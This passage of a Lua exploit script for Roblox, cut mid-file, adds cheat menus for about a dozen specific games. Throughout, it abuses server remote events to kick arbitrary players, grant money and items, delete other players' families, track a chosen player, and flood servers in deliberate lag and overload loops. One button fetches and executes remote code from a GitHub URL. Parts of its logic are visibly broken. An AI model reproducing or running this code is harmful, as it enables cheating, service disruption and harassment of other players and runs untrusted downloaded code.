RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewDropdown("Get Any Badge", "OP But Not", {"PSEasyMode", "PSNormalMode", "PSHardMode", "PSExtremeMode"}, function(Badge)
    local args = {
        [1] = Badge
    }
    game:GetService("ReplicatedStorage").Knit.Services.PlayerBadgeService.RF.rewardBadge:InvokeServer(unpack(args))
    end)
end

if game.PlaceId == 8265676621 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

    local dropdown = MainSection:NewDropdown("Kick Any Player", "OP But Not", newPlayerList, function(TheVictim)
        RefreshPlayerList()
        game.ReplicatedStorage.KickPlayer:FireServer(TheVictim)
    end)

    MainSection:NewButton("Refresh player list", "Refreshes player list", function()
        RefreshPlayerList()
        dropdown:Refresh(newp)
    end)
end

if game.PlaceId == 7262582142 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewTextBox("Paintbrush - Desc", "Max is 99", function(PaintBrushLevel)
    local args = {
        [1] = "Equip",
        [2] = {
            ["Tool"] = "T".. PaintBrushLevel
        }
    }
    game:GetService("ReplicatedStorage").SpecWork.Shared.Network.ToggleTool:InvokeServer(unpack(args))
    end)

MainSection:NewTextBox("FillPaint - Desc", "Max is 100", function(FillPaint)
    local args = {
        [1] = FillPaint
    }

    game:GetService("ReplicatedStorage").SpecWork.Shared.Network.RefillPaint:FireServer(unpack(args))
    end)

MainSection:NewButton("Inf Paint", "PainBrush", function()
    InfPaint = true
    while InfPaint == true do
        local args = {
            [1] = 100
        }
        game:GetService("ReplicatedStorage").SpecWork.Shared.Network.RefillPaint:FireServer(unpack(args))
        wait(0.005)
        end
    end)

MainSection:NewButton("Stop InfPaint", "Anti PainBrush", function()
    InfPaint = false
    end)
end

if game.PlaceId == 9476339275 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("Diamond Cup ESP", "press when diamonds r shown", function(DiamondCup1)
    for i,v in pairs(workspace:GetChildren()) do
        if v.Name == "fakediamond1" then v:Destroy() end
    end
    
    local diamondmesh = Instance.new("MeshPart")
    diamondmesh.Anchored = true
    diamondmesh.MeshId = "rbxassetid://10241207391"
    diamondmesh.Name = "fakediamond1"
    diamondmesh.Size = Vector3.new(0.507319, 0.543082, 0.585802)
    Instance.new("Highlight", diamondmesh)
    
    local player = game.Players.LocalPlayer
    local character = player.character
    local arena
    local cupFolder
    
    for _, v in pairs(game:GetService("Workspace").ArenasREAL:GetDescendants()) do
        if v:IsA("TextLabel") and v.Text == "@"..player.Name then
            arena = v.Parent.Parent.Parent.Parent.Parent.Parent.Parent
        end
    end
    
    for _, v in pairs(arena:GetDescendants()) do
        if v.Name == "Spot" then
            v.Parent.Name = tostring(v.Value)
            cupFolder = v.Parent.Parent
        end
    end
    
    for _,diamond in pairs(arena.ArenaTemplate.Important.Diamonds:GetChildren()) do
        if diamond.Transparency == 1 then continue end
        
        local closest,distance = nil, 1000
        for _,cup in pairs(cupFolder:GetChildren()) do
            local mag = (cup.Detail.Position - diamond.Position).Magnitude
            if mag < distance then closest = cup distance = mag end
        end
        
        local clone = diamondmesh:Clone()
        clone.Parent = workspace
        clone.Position = closest.Primary.Position
        closest.Primary:GetPropertyChangedSignal("Position"):Connect(function()
            clone.Position = closest.Primary.Position
        end)
    end
    end)
end

if game.PlaceId == 10375377326 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("FillMachine", "Fills PopcornMachine", function()
    local args = {
        [1] = math.huge
    }
    game:GetService("ReplicatedStorage").Deposit:FireServer(unpack(args))
    end)

MainSection:NewButton("AutoFillMachine", "AutoFills PopcornMachine", function()
    AutoFillPopcorn = true
    while AutoFillPopcorn == true do
    local args = {
        [1] = math.huge
    }
    game:GetService("ReplicatedStorage").Deposit:FireServer(unpack(args))
    wait(0.1)
    end
    end)

MainSection:NewButton("Stop AutoFillMachine", "Stops AutoFillMachine", function()
    AutoFillPopcorn = false
    end)
end

if game.PlaceId == 9609300403 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("AutoClick", "Autoclicks", function()
    AutoClicks = true
    while AutoClicks == true do
        game:GetService("ReplicatedStorage").Communication.Click:FireServer()
        wait(BigTick)
        end
    end)

MainSection:NewButton("Stop AutoClick", "StopsAutoClick", function()
    AutoClicks = false
    end)
end

if game.PlaceId == 10319501620 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("AutoCoins", "AutoCollects Coins", function()
    AutoCoin = true
    while AutoCoin == true do
        local args = {
            [1] = "(x:-13.172073364257812, y:31.68347930908203, z:-81.21162414550781)"
        }
        game:GetService("ReplicatedStorage").RemoteEvents.RewardCurrencyPickup:FireServer(unpack(args))
        wait(BigTick)
        end
    end)

MainSection:NewButton("Stop AutoCoin", "Stops AutoCoin", function()
    AutoCoin = false
    end)

MainSection:NewButton("AllStickers", "Gets all the stickers", function()
    game:GetService("ReplicatedStorage").RemoteFunctions.PlayerCollectionAdd:InvokeServer("Stickers", "Sticker1")
    game:GetService("ReplicatedStorage").RemoteFunctions.PlayerCollectionAdd:InvokeServer("Stickers", "Sticker2")
    game:GetService("ReplicatedStorage").RemoteFunctions.PlayerCollectionAdd:InvokeServer("Stickers", "Sticker3")
    game:GetService("ReplicatedStorage").RemoteFunctions.PlayerCollectionAdd:InvokeServer("Stickers", "Sticker4")
    game:GetService("ReplicatedStorage").RemoteFunctions.PlayerCollectionAdd:InvokeServer("Stickers", "Sticker5")
    game:GetService("ReplicatedStorage").RemoteFunctions.PlayerCollectionAdd:InvokeServer("Stickers", "Sticker6")
    game:GetService("ReplicatedStorage").RemoteFunctions.PlayerCollectionAdd:InvokeServer("Stickers", "Sticker7")
    game:GetService("ReplicatedStorage").RemoteFunctions.PlayerCollectionAdd:InvokeServer("Stickers", "Sticker8")
    game:GetService("ReplicatedStorage").RemoteFunctions.PlayerCollectionAdd:InvokeServer("Stickers", "Sticker9")
    game:GetService("ReplicatedStorage").RemoteFunctions.PlayerCollectionAdd:InvokeServer("Stickers", "Sticker10")
    end)

MainSection:NewDropdown("Get Sticker", "Get Any Sticker", {"1", "2", "3", "4", "5", "6", "7", "8", "9", "10"}, function(Sticker)
    game:GetService("ReplicatedStorage").RemoteFunctions.PlayerCollectionAdd:InvokeServer("Stickers", "Sticker".. Sticker)
    end)
end

if game.PlaceId == 9529019408 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("Unlock Circus", "Unlocks the Circus World", function()
    game:GetService("ReplicatedStorage").Assets.Network.GrabCircusKey:FireServer()
    end)
end

if game.PlaceId == 5890116343 then
    -- MAIN
    RefreshPlayerList()
    local Main = Window:NewTab("Main")

    GodMode = false
    GodModeV2 = false
    AutoAgeUp = false
    AutoAgeUpSpeed = 1
    SelectedPlayer = ""
    LevelFarm = false
    ShowFamilies = false
    SavedLocation = CFrame.new(0,0,0)

    function AutoAgeFunction()
        while AutoAgeUp do
            for i = 1, AutoAgeUpSpeed do
                game:GetService("ReplicatedStorage").Remotes.AgeUp:FireServer()
            end 
        wait(SmallTick)
        end
    end

    AutoAgeFunction()

    local GamepassSection = Main:NewSection("Gamepasses")

    GamepassSection:NewToggle("Age Faster", "Makes you age faster", function(state)
        if state then
            game.Players.LocalPlayer.Settings.AgeFaster.Value = true
            game:GetService("Players").LocalPlayer.PlayerGui.MainGui.SettingsFrame.OptionsFrame.AgeFaster.ToggleButton.Button.UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromHex("#55FF00")),ColorSequenceKeypoint.new(1, Color3.fromHex("#9CFF81"))} 
            game:GetService("Players").LocalPlayer.PlayerGui.MainGui.SettingsFrame.OptionsFrame.AgeFaster.ToggleButton.Button.TextLabel.Text = "ON"    
        else
            game.Players.LocalPlayer.Settings.AgeFaster.Value = false
            game:GetService("Players").LocalPlayer.PlayerGui.MainGui.SettingsFrame.OptionsFrame.AgeFaster.ToggleButton.Button.UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromHex("#FF0000")),ColorSequenceKeypoint.new(1, Color3.fromHex("#FF4F4F"))} 
            game:GetService("Players").LocalPlayer.PlayerGui.MainGui.SettingsFrame.OptionsFrame.AgeFaster.ToggleButton.Button.TextLabel.Text = "OFF"  
        end
    end)

    GamepassSection:NewToggle("Freeze Age", "Freezes Your Age", function(state)
        if state then
            game.Players.LocalPlayer.Settings.FreezeAge.Value = true
            game:GetService("Players").LocalPlayer.PlayerGui.MainGui.SettingsFrame.OptionsFrame.FreezeAge.ToggleButton.Button.UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromHex("#55FF00")),ColorSequenceKeypoint.new(1, Color3.fromHex("#9CFF81"))}     
            game:GetService("Players").LocalPlayer.PlayerGui.MainGui.SettingsFrame.OptionsFrame.FreezeAge.ToggleButton.Button.TextLabel.Text = "ON"    
        else
            game.Players.LocalPlayer.Settings.FreezeAge.Value = false
            game:GetService("Players").LocalPlayer.PlayerGui.MainGui.SettingsFrame.OptionsFrame.FreezeAge.ToggleButton.Button.UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromHex("#FF0000")),ColorSequenceKeypoint.new(1, Color3.fromHex("#FF4F4F"))}     
            game:GetService("Players").LocalPlayer.PlayerGui.MainGui.SettingsFrame.OptionsFrame.FreezeAge.ToggleButton.Button.TextLabel.Text = "OFF"   
        end
    end)

    local AgeSection = Main:NewSection("Age")

    AgeSection:NewButton("AgeUp", "Get 1 year older", function()
        game:GetService("ReplicatedStorage").Remotes.AgeUp:FireServer()
    end)

    AgeSection:NewSlider("Auto Age Speed", "Info", 20, 1, function(s)
        AutoAgeUpSpeed = s
    end)

    AgeSection:NewToggle("Toggle Auto Age Up", "Toggles Auto Age Up", function(state)
        if state then
            AutoAgeUp = true
            AutoAgeFunction()
        else
            AutoAgeUp = false
            wait(0.5)
            game:GetService("ReplicatedStorage").Remotes.AgeUp:FireServer()
        end
    end)

    AgeSection:NewButton("Save Age", "kicks u", function()
        wait(1)
        game.Players.LocalPlayer:Kick("Rejoin")
    end)

    local LevelSection = Main:NewSection("Lvl Farm - WIP")

    LevelSection:NewToggle("Level Farm", "Supa Cool", function(state)
        if state then
            LevelFarm = true
            --Save Location
            SavedLocation = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame
            --Anti Move
            game.Players.LocalPlayer.Character:WaitForChild("Humanoid").WalkSpeed = 0
            game.Players.LocalPlayer.Character:WaitForChild("Humanoid").JumpPower = 0
        
            --Noclip
            for _, part in ipairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end

            --Anti AFK
            game:GetService("Players").LocalPlayer.Idled:Connect(function()
                if LevelFarm then
                    game:GetService("VirtualUser"):CaptureController()
                    game:GetService("VirtualUser"):ClickButton2(Vector2.new())
                end
            end)
        
            while LevelFarm do
                --lock position
                game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = 
                    CFrame.new(391.17994047062, 35.53553771972656, 47.28309761209691) * 
                    game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame:ToObjectSpace(
                        game:GetService("Players").LocalPlayer.Character:WaitForChild("LeftFoot").CFrame
                ):Inverse()

                --Spin
                game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame * CFrame.Angles(0, math.rad(100 * wait()), 0)
                --AutoPunch
                game:GetService("ReplicatedStorage").Remotes.PunchEvent:FireServer()
                wait(0.1)
            end
        else
            LevelFarm = false
            game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = SavedLocation
            game.Players.LocalPlayer.Character:WaitForChild("Humanoid").WalkSpeed = 16
            game.Players.LocalPlayer.Character:WaitForChild("Humanoid").JumpPower = 50
        end               
    end)

    local GodModeSection = Main:NewSection("GodMode")

    GodModeV2BTN = GodModeSection:NewButton("Toggle GodMode V2 (off)", "a lil better", function()
    local tempPos
        if game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            if GodModeV2 == false then
                game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)

                tempPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position

                while (game:GetService("Players").LocalPlayer.Safezone.Value == false) do
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7.25, 13, -237)

                    local connection
                    connection = game:GetService("RunService").RenderStepped:Connect(function()
                        game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):Move(Vector3.new(0, 0, 1))
                        connection:Disconnect()
                    end)

                    wait(0.15)
                end

                wait(0.15)
                game:GetService("Players").LocalPlayer.Safezone.Value = false
                wait(0.15)

                local connection
                connection = game:GetService("RunService").RenderStepped:Connect(function()
                    game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):Move(Vector3.new(0, 0, 1))
                    -- game.Players.LocalPlayer.Character:WaitForChild("Humanoid").WalkSpeed = 16
                    connection:Disconnect()
                end)

                GodModeV2 = true
                GodModeV2BTN:UpdateButton("Toggle GodMode V2 (on)") 
                wait(0.15)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(tempPos.X, tempPos.Y, tempPos.Z)
            elseif GodModeV2 == true then
                game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)

                tempPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position

                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7.25, 13, -237)

                local connection
                connection = game:GetService("RunService").RenderStepped:Connect(function()
                    game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):Move(Vector3.new(0, 0, 1))
                    -- game.Players.LocalPlayer.Character:WaitForChild("Humanoid").WalkSpeed = 16
                    connection:Disconnect()
                end)

                wait(0.15)
                game:GetService("Players").LocalPlayer.Safezone.Value = true
                wait(0.15)

                local connection
                connection = game:GetService("RunService").RenderStepped:Connect(function()
                    game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):Move(Vector3.new(0, 0, 1))
                    -- game.Players.LocalPlayer.Character:WaitForChild("Humanoid").WalkSpeed = 16
                    connection:Disconnect()
                end)

                GodModeV2 = true
                GodModeV2BTN:UpdateButton("Toggle GodMode V2 (off)") 
                wait(0.15)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(tempPos.X, tempPos.Y, tempPos.Z)
            end
        else 
            print("Humanoid Root Part or Player Not Found!") 
        end
    end)

    GodModeBTN = GodModeSection:NewButton("Toggle GodMode (OLD) (off)", "a lil glitchy", function()
        if GodMode == false then
            GodMode = true
            GodModeBTN:UpdateButton("Toggle GodMode (OLD) (on)") 
            while GodMode == true do
                local args = {
                    [1] = true
                }
                game:GetService("ReplicatedStorage").Remotes.toggleSafe:FireServer(unpack(args))
                wait(BigsmallTick)
            end
        elseif GodMode == true then
            GodMode = false
            GodModeBTN:UpdateButton("Toggle GodMode (OLD) (off)") 
        end
    end)

    local FamilyTab = Window:NewTab("Family")
    local FamilySection = FamilyTab:NewSection("Family")

    FamilySection:NewButton("Invite All Players", 'Cool', function()
        for i, player in pairs(game:GetService("Players"):GetPlayers()) do
            game:GetService("ReplicatedStorage"):FindFirstChild("Remotes"):FindFirstChild("SendInvite"):FireServer(player)
            task.wait(SmallTick)
        end
    end)

    FamilySection:NewButton("Delete All Families", 'Cooler', function()
        for i, player in pairs(game:GetService("Players"):GetPlayers()) do
            game:GetService("ReplicatedStorage").Remotes.KickFromFamily:FireServer(player)
            wait(SmallTick)
        end
        FamilyAccountsCheck() 
    end)    

    FamilySection:NewTextBox("Create Family", "Create A Family", function(FamilyName)
        game:GetService("ReplicatedStorage").Remotes.CreateFamily:FireServer(FamilyName)
    end)

    JoinFam = FamilySection:NewDropdown("Join Family", "Joins any family", FamiliesAntilag, function(Family)
        game:GetService("ReplicatedStorage").Remotes.AcceptInvite:FireServer(Family)
        FamilyAccountsCheck() 
    end)

    DelFam = FamilySection:NewDropdown("Delete A Family", "Deletes any family", FamiliesAntilag, function(Family)
        print(Family)
        for _, child in ipairs(game:GetService("ReplicatedStorage"):WaitForChild("Families"):GetChildren()) do
            print(child.Name)
            if (child.Name == Family) then
                for _, grandchild in ipairs(child:GetChildren()) do
                    for _, selectedPlayer in ipairs(game:GetService("Players"):GetChildren()) do
                        if (selectedPlayer.Name == grandchild.Name) then
                            game:GetService("ReplicatedStorage").Remotes.KickFromFamily:FireServer(selectedPlayer)
                        end
                    end
                    wait(SmallTick)
                end
            end
        end
        FamilyAccountsCheck() 
    end)

    KickFromFam = FamilySection:NewDropdown("KickFromFamily", "Kicks a player from their family", FamilyAccountsAntilag, function(FamilyKickPlayer)

        local AccIndex = findFirstString(FamilyAccounts, FamilyKickPlayer)
        if AccIndex then
            game:GetService("ReplicatedStorage").Remotes.KickFromFamily:FireServer(game:GetService("Players"):WaitForChild(FamilyAccountsPlain[AccIndex]))
        else
            print("Player Not Found")
        end
        FamilyAccountsCheck() 
    end)

    InvitePlayer = FamilySection:NewDropdown("InviteAnyPlayer", "Invite anyone to the family you are currently in", newPlayerList, function(FamilyInvitePlayer)
        RefreshPlayerList()
        playerToInvite = FamilyInvitePlayer
        game:GetService("ReplicatedStorage").Remotes.SendInvite:FireServer(game:GetService("Players"):FindFirstChild(playerToInvite))
    end)

    local function FamilyAccountsCheck() 
        print("Running")

        for _, family in ipairs(game:GetService("ReplicatedStorage"):WaitForChild("Families"):GetChildren()) do
            if string.match(string.sub(family.Name, 1, 20), "😊") or string.match(string.sub(family.Name, 1, 20), "😂") or string.match(string.sub(family.Name, 1, 20), "🥳") or string.match(string.sub(family.Name, 1, 20), "🧑‍🚀") or
               string.match(string.sub(family.Name, 1, 20), "🌟") or string.match(string.sub(family.Name, 1, 20), "🚀") or string.match(string.sub(family.Name, 1, 20), "🀄") or string.match(string.sub(family.Name, 1, 20), "🎉") or
               string.match(string.sub(family.Name, 1, 20), "🤖") or string.match(string.sub(family.Name, 1, 20), "👾") or string.match(string.sub(family.Name, 1, 20), "💖") or string.match(string.sub(family.Name, 1, 20), "🐉") or
               string.match(string.sub(family.Name, 1, 20), "🏰") or string.match(string.sub(family.Name, 1, 20), "⚡") or string.match(string.sub(family.Name, 1, 20), "📚") or string.match(string.sub(family.Name, 1, 20), "🍕") or
               string.match(string.sub(family.Name, 1, 20), "🎮") or string.match(string.sub(family.Name, 1, 20), "💎") or string.match(string.sub(family.Name, 1, 20), "🚗") or string.match(string.sub(family.Name, 1, 20), "🌍") then
                family:Destroy()
            elseif string.match(family.Name, "^#") and #family.Name / 2 > #family.Name then
                family:Destroy()
            end
        end 
        print("done filtering families")

        if ShowFamilies then
            local Families = {}
            for _, child in ipairs(game:GetService("ReplicatedStorage"):WaitForChild("Families"):GetChildren()) do
                table.insert(Families, child.Name)
            end
            
            local FamilyAccounts = {}
            for _, child in ipairs(game:GetService("ReplicatedStorage"):WaitForChild("Families"):GetChildren()) do
                local childName = child.Name
                for _, grandchild in ipairs(child:GetChildren()) do
                    table.insert(FamilyAccounts, grandchild.Name .. " (" .. childName .. ")")
                end
            end
            
            local FamilyAccountsPlain = {}
            for _, child in ipairs(game:GetService("ReplicatedStorage"):WaitForChild("Families"):GetChildren()) do
                for _, grandchild in ipairs(child:GetChildren()) do
                    table.insert(FamilyAccountsPlain, grandchild.Name)
                end
            end
            local FamilyAccountsAntilag = FamilyAccounts
            local FamiliesAntilag = Families
        else 
            local FamilyAccountsAntilag = {}
            local FamiliesAntilag = {}
        end
        print("Refreshing families")
        JoinFam:Refresh(FamiliesAntilag)
        DelFam:Refresh(FamiliesAntilag)
        KickFromFam:Refresh(FamilyAccountsAntilag)
        RefreshPlayerList()
        InvitePlayer:Refresh(newPlayerList)
        print("Refreshing families DONE")
    end

    FamilySection:NewButton("Update All Lists", "updates eveything", function()
        FamilyAccountsCheck() 
    end)

    FamilySection:NewToggle("Show Families (CAN LAG)", "Some explpoits can lag this part", function(state)
        ShowFamilies = state
    end)

    local SpyingTab = Window:NewTab("Spying")
    local SpySection = SpyingTab:NewSection("Spying")

    SpyUsername = SpySection:NewLabel("😀Username: ")
    SpyDisplayName = SpySection:NewLabel("😊Display Name: ")
    SpyUserID = SpySection:NewLabel("😨UserID: ")
    SpyRPName = SpySection:NewLabel("😁RP Name: ")
    SpyAge = SpySection:NewLabel("🙎‍♂️Age: ")
    SpyLevel = SpySection:NewLabel("➕LvL: ")
    SpyFamily = SpySection:NewLabel("👨‍👩‍👧‍👦Family: ")
    SpyFamilyInvites = SpySection:NewLabel("📫Family Invites: ")
    SpyAttacking = SpySection:NewLabel("⚔️Attacking: ")
    SpySafezone = SpySection:NewLabel("🛡️Safezone: ")
    SpyMusic = SpySection:NewLabel("🎵Music: ")
    SpyFreezeAge = SpySection:NewLabel("🧊Freeze Age: ")
    SpyAgeFaster = SpySection:NewLabel("👴Age Faster: ")
    --SpyHealth = SpySection:NewLabel("🩹Health: ")
    --SpyLocation = SpySection:NewLabel("🏳️Location: ")
    --SpyHacking = SpySection:NewLabel("💻Hacking: ")

local detectionEnabled = false
local selectedPlayer = nil

function UpdateSpy(playerName)
    if not playerName then
        detectionEnabled = false -- Stop detection to minimize lag
        selectedPlayer = nil
        return
    end

    selectedPlayer = playerName
    detectionEnabled = true

    local player = game:GetService("Players"):FindFirstChild(selectedPlayer)

    -- Initial update of all labels
    SpyUsername:UpdateLabel("😀Username: " .. selectedPlayer)
    SpyDisplayName:UpdateLabel("😊Display Name: " .. player.DisplayName)
    SpyUserID:UpdateLabel("😨UserID: " .. player.UserId)
    SpyRPName:UpdateLabel("😁RP Name: " .. (player.leaderstats:FindFirstChild("RP Name") and player.leaderstats:FindFirstChild("RP Name").Value or "N/A"))
    SpyAge:UpdateLabel("🙎‍♂️Age: " .. (string.sub(game:GetService("Workspace"):FindFirstChild(selectedPlayer).Head.InfoGui.Frame.Age.Text, 5) or string.sub(player.PlayerGui.MainGui.AgeFrame.Frame.TextLabel.Text, 5)))
    SpyLevel:UpdateLabel("➕LvL: " .. tostring(player.leaderstats:FindFirstChild("Level") and player.leaderstats:FindFirstChild("Level").Value or "N/A"))

    SpyFamily:UpdateLabel("👨‍👩‍👧‍👦Family: " .. (player:FindFirstChild("Family") and (player.Family.Value ~= "" and player.Family.Value or "No Family") or "N/A"))
    SpyFamilyInvites:UpdateLabel("📫Family Invites: " .. (player.Settings.FamilyInvites.Value and "🟢" or "🔴"))
    SpyAttacking:UpdateLabel("⚔️Attacking: " .. (player:FindFirstChild("Attacking") and player.Attacking.Value and "🟢" or "🔴"))
    SpySafezone:UpdateLabel("🛡️Safezone: " .. (player:FindFirstChild("Safezone") and player.Safezone.Value and "🟢" or "🔴"))
    SpyMusic:UpdateLabel("🎵Music: " .. (player.Settings.Music.Value and "🟢" or "🔴"))
    SpyFreezeAge:UpdateLabel("🧊Freeze Age: " .. (player.Settings.FreezeAge.Value and "🟢" or "🔴"))
    SpyAgeFaster:UpdateLabel("👴Age Faster: " .. (player.Settings.AgeFaster.Value and "🟢" or "🔴"))

    -- Set up value change detectors
    local function setupDetector(instance, property, updateFunc)
        if instance and instance:FindFirstChild(property) then
            instance[property].Changed:Connect(function()
                if detectionEnabled and selectedPlayer == playerName then
                    updateFunc()
                end
            end)
        end
    end

    setupDetector(player.Settings, "FamilyInvites", function()
        SpyFamilyInvites:UpdateLabel("📫Family Invites: " .. (player.Settings.FamilyInvites.Value and "🟢" or "🔴"))
    end)

    setupDetector(player, "Attacking", function()
        SpyAttacking:UpdateLabel("⚔️Attacking: " .. (player.Attacking.Value and "🟢" or "🔴"))
    end)

    setupDetector(player, "Safezone", function()
        SpySafezone:UpdateLabel("🛡️Safezone: " .. (player.Safezone.Value and "🟢" or "🔴"))
    end)

    setupDetector(player.Settings, "Music", function()
        SpyMusic:UpdateLabel("🎵Music: " .. (player.Settings.Music.Value and "🟢" or "🔴"))
    end)

    setupDetector(player.Settings, "FreezeAge", function()
        SpyFreezeAge:UpdateLabel("🧊Freeze Age: " .. (player.Settings.FreezeAge.Value and "🟢" or "🔴"))
    end)

    setupDetector(player.Settings, "AgeFaster", function()
        SpyAgeFaster:UpdateLabel("👴Age Faster: " .. (player.Settings.AgeFaster.Value and "🟢" or "🔴"))
    end)
end


    PlayerSelector = SpySection:NewDropdown("Select Player", "Selects A Player", {"Nobody ❌", unpack(newPlayerList)}, function(SelectedPlayerDropdown)
        if SelectedPlayerDropdown ~= SelectedPlayerSpy then
            UpdateSpy()
            SelectedPlayerSpy = SelectedPlayerDropdown
            UpdateSpy(SelectedPlayerDropdown)
        else
            if SelectedPlayerDropdown == "NOBODY ❌" then
                UpdateSpy()
            end
        end

        RefreshPlayerList()
    end)  

    SpySection:NewButton("Refresh Player Selector", "wooooow", function()
        RefreshPlayerList()
        PlayerSelector:Refresh({"Nobody ❌", unpack(newPlayerList)})
    end)

    local LagTab = Window:NewTab("Lag & Trolling")
    local LagSection = LagTab:NewSection("Lag Server")

    Agelag = false
    GlobalInvitelag = false
    SoloInvitelag = ""

    LagSection:NewButton("Age Lag", "Ages Up, Glitches and resets others levels", function()
        while true do
            for i = 1, 1000 do
                game:GetService("ReplicatedStorage").Remotes.AgeUp:FireServer()
            end 
            wait(SmallTick)
        end
    end)

    LagSection:NewButton("Server Overload (Takes a long time)", "Overloads server with data", function()
        local topCharacters = {
            "😊", "😂", "🥳", "🧑‍🚀", "🌟", "🚀", "🀄", "🎉", "🤖", "👾",
            "💖", "🐉", "🏰", "⚡", "📚", "🍕", "🎮", "💎", "🚗", "🌍"
        }
        local combinedString = table.concat(topCharacters)
        local finalString = string.rep(combinedString, 71)
        while true do
            for i = 1, 1000 do
                game:GetService("ReplicatedStorage").Remotes.CreateFamily:FireServer(finalString)
            end
            wait(SmallTick)
        end
    end)

    LagSection:NewButton("Global Family Invite Lag", "Lags server with age", function()
        local topCharacters = {
            "😊", "😂", "🥳", "🧑‍🚀", "🌟", "🚀", "🀄", "🎉", "🤖", "👾",
            "💖", "🐉", "🏰", "⚡", "📚", "🍕", "🎮", "💎", "🚗", "🌍"
        }
        local combinedString = table.concat(topCharacters)
        local finalString = string.rep(combinedString, 71)
        game:GetService("ReplicatedStorage").Remotes.CreateFamily:FireServer(finalString)
        wait(3)
        while true do
            for i, player in pairs(game:GetService("Players"):GetPlayers()) do
                for i = 1, 10 do
                    game:GetService("ReplicatedStorage"):FindFirstChild("Remotes"):FindFirstChild("SendInvite"):FireServer(player)
                    --game:GetService("ReplicatedStorage").Remotes.CreateFamily:FireServer(finalString)
                end
                wait(SmallTick)
            end
        end
    end)

    FamilyLagInviteSolo = LagSection:NewDropdown("Solo Family Invite Lag", "Lags server with age", {"Nobody ❌", unpack(newPlayerList)} , function(PlayerSelected)
        RefreshPlayerList()
        SoloInvitelag = PlayerSelected
        if PlayerSelected == "Nobody ❌" then
            SoloInvitelag = ""
        else
            local topCharacters = {
                "😊", "😂", "🥳", "🧑‍🚀", "🌟", "🚀", "🀄", "🎉", "🤖", "👾",
                "💖", "🐉", "🏰", "⚡", "📚", "🍕", "🎮", "💎", "🚗", "🌍"
            }
            local combinedString = table.concat(topCharacters)
            local finalString = string.rep(combinedString, 71)
            game:GetService("ReplicatedStorage").Remotes.CreateFamily:FireServer(finalString)
            wait(3)
            PlayerSelectedBackup = PlayerSelected
            while SoloInvitelag == PlayerSelected do
                for i = 1, 10 do
                    game:GetService("ReplicatedStorage"):FindFirstChild("Remotes"):FindFirstChild("SendInvite"):FireServer(game:GetService("Players"):FindFirstChild(PlayerSelectedBackup))
                end
                wait(SmallTick)
            end
        end 
    end)

    LagSection:NewButton("Refresh Player Selector", "wooooow", function()
        RefreshPlayerList()
        FamilyLagInviteSolo:Refresh({"Nobody ❌", unpack(newPlayerList)})
    end)
end

if game.PlaceId == 9926433554 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewTextBox("Get Money", "Get how much money u want", function(MoneyGet)
    local A_1 = {} game:GetService("ReplicatedStorage").Events.Recent.AxeEvent:FireServer(A_1, -MoneyGet)
    end)

MainSection:NewTextBox("Get/Equipt Any Pickaxe", "a lil glitchy, rejoin if not work", function(Pickaxe)
    local args = {
        [1] = "Pickaxe # " ..Pickaxe,
        [2] = Pickaxe
    }
    game:GetService("ReplicatedStorage").Events.Recent.BuyAxe:FireServer(unpack(args))
    wait(0.2)
    local args = {
        [1] = Pickaxe
    }
    game:GetService("ReplicatedStorage").Events.EquipPickaxe:InvokeServer(unpack(args))
    game.Players.LocalPlayer:Kick("Rejoin")

    end)
end

if game.PlaceId == 10218305738 then
    -- MAIN
RefreshPlayerList()
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Main")

MainSection:NewButton("Unlimited Steps", "Dont Lose Steps", function()
    local a=game.Players.LocalPlayer.Character;a.HumanoidRootPart:Destroy()local b=a.Humanoid;b.Parent=game.ServerStorage;b.Parent=a
    end)

MainSection:NewButton("Sword Reach", "OP", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/X2isme/Roblox-Hub/main/Reech.lua",true))()
    end)
end

